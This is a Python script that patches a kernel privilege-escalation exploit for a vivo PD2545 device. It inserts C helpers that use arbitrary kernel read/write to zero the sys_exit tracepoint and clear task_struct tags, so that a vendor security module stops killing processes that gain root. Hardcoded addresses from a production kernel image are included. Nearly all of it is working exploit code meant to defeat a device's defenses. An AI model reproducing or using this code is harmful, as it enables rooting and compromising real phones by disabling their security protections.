#!/usr/bin/env python3
"""Add the vivo vr.ko neutralization to the PD2545D CVE-2026-64560 payload.

Two layers, matching the upstream vr_guard semantics (ROUTES.md §2):

  PreSpawn : zero __tracepoint_sys_exit.funcs, disarming the sys_exit
             tracepoint probe that kills any task reaching euid 0.
  PostSpawn: clear the root child's thread_info flags word (tag A + 0x400)
             first, then tag B at task_struct+0x2c.

Addresses are from the certified r59 production Image:
  __tracepoint_sys_exit = 0xffffffc0826d8de0
  funcs offset          = 0x48  (from __traceiter_sys_exit: ldr x21,[x8,#0xe28],
                                 page base 0xffffffc0826d8000 => +0xde0+0x48)

The script is idempotent: it refuses to insert twice.
"""
import sys

SRC = 'cve-2026-64560-pd2545.c'
src = open(SRC, encoding='utf-8').read()

if 'VR_GUARD_DISARM_PASS' in src:
    print('already patched')
    sys.exit(0)

# 1) defines, after LINK_END
anchor = '#define LINK_END UINT64_C(0xffffffc082820000)\n'
defs = anchor + '''
/* vivo vr.ko neutralization.  __tracepoint_sys_exit and its funcs offset are
 * from the certified r59 Image; funcs=0 disarms the sys_exit probe that kills
 * tasks reaching euid 0.  Task tag offsets are the upstream 6.12 layout:
 * flags word at +0x0 (tag A + syscall-tracepoint bit 0x400), tag B at +0x2c. */
#define LINK_SYS_EXIT_TP UINT64_C(0xffffffc0826d8de0)
#define TP_FUNCS_OFF UINT64_C(0x48)
#define VR_TASK_FLAGS_OFF UINT64_C(0x0)
#define VR_TASK_TAG_B_OFF UINT64_C(0x2c)
'''
if src.count(anchor) != 1:
    sys.exit('LINK_END anchor not unique')
src = src.replace(anchor, defs)

# 2) helpers after untag_kernel_pointer()
anchor = '''static uint64_t untag_kernel_pointer(uint64_t value) {
    return (uint64_t)((int64_t)(value << 8) >> 8);
}
'''
helpers = anchor + '''
static int vr_guard_disarm(int fd)
{
    uint64_t address = LINK_SYS_EXIT_TP + kernel_slide + TP_FUNCS_OFF;
    uint64_t before = 0;
    uint64_t after = 1;

    if (!kernel_slide)
        return -1;
    if (bridge_read64(fd, address, &before))
        return -1;
    if (!before) {
        printf("VR_GUARD_DISARM_SKIP address=%#llx funcs_already=0\\n",
               (unsigned long long)address);
        return 0;
    }
    if (bridge_write64(fd, address, 0))
        return -1;
    if (bridge_read64(fd, address, &after) || after)
        return -1;
    printf("VR_GUARD_DISARM_PASS address=%#llx funcs_before=%#llx funcs_after=0\\n",
           (unsigned long long)address, (unsigned long long)before);
    return 0;
}

static int vr_guard_clear_child(int fd, uint64_t raw_task)
{
    uint64_t task = untag_kernel_pointer(raw_task);
    uint64_t flags_before = 0;
    uint64_t flags_after = 1;
    uint64_t tag_word = 0;
    unsigned char zero = 0;

    if (!task)
        return -1;
    if (bridge_read64(fd, task + VR_TASK_FLAGS_OFF, &flags_before))
        return -1;
    if (bridge_write64(fd, task + VR_TASK_FLAGS_OFF, 0))
        return -1;
    if (bridge_read64(fd, task + VR_TASK_FLAGS_OFF, &flags_after) || flags_after)
        return -1;
    /* tag B is the byte at +0x2c; read the containing qword at +0x28. */
    if (bridge_read64(fd, task + VR_TASK_TAG_B_OFF - 4, &tag_word))
        return -1;
    if (bridge_write_once(fd, task + VR_TASK_TAG_B_OFF, &zero, 1) != 1)
        return -1;
    if (bridge_read64(fd, task + VR_TASK_TAG_B_OFF - 4, &tag_word) ||
        ((tag_word >> 32) & 0xff))
        return -1;
    printf("VR_GUARD_TAGS_PASS task=%#llx flags_before=%#llx tag_b_after=0\\n",
           (unsigned long long)task, (unsigned long long)flags_before);
    return 0;
}
'''
if src.count(anchor) != 1:
    sys.exit('untag anchor not unique')
src = src.replace(anchor, helpers)

# 3) PreSpawn disarm, immediately before the root-child clone
anchor = '    child = syscall(SYS_clone, SIGCHLD, 0, NULL, NULL, 0);\n'
call = '''    if (vr_guard_disarm(reader_fd)) {
        printf("VR_GUARD_DISARM_FAIL errno=%d\\n", errno);
        goto out;
    }
''' + anchor
if src.count(anchor) != 1:
    sys.exit('root child clone anchor not unique')
src = src.replace(anchor, call)

# 4) PostSpawn tag clear, after the child task/cred final gate
anchor = '''    printf("STAGE8_CHILD_TASK_CRED_FINAL_PASS task=%#llx cred=%#llx "
           "reads=%d\\n",
           (unsigned long long)child_match.raw_task, (unsigned long long)child_match.snapshot.cred,
           DP_TASK_STABLE_READS);
'''
call = anchor + '''    if (vr_guard_clear_child(reader_fd, child_match.raw_task)) {
        printf("VR_GUARD_TAGS_FAIL task=%#llx errno=%d\\n",
               (unsigned long long)child_match.raw_task, errno);
        goto release_child;
    }
'''
if src.count(anchor) != 1:
    sys.exit('child final gate anchor not unique')
src = src.replace(anchor, call)

open(SRC, 'w', encoding='utf-8').write(src)
print('vr_guard inserted; bytes', len(src))
